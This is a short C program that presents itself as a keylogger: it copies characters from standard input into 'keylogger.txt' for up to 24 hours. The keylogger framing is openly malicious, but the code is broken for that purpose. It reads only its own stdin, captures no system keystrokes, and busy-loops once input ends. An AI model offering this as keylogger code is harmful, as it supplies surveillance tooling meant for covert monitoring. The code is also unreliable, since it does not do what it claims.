#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void keylog()
{
    FILE * fPtr;
    fPtr = fopen("keylogger.txt", "w");

    if(fPtr == NULL)
    {
        printf("Failed to open file\n");
        exit(1);
    }

    int ch;
    time_t start_time = time(NULL);

    while(1)
    {
        ch = getchar();

        if(time(NULL) - start_time >= 24*60*60)
        {
            fclose(fPtr);
            break;
        }

        if(ch != EOF)
            fputc(ch, fPtr);
    }
}

int main()
{
    keylog();
    return 0;
}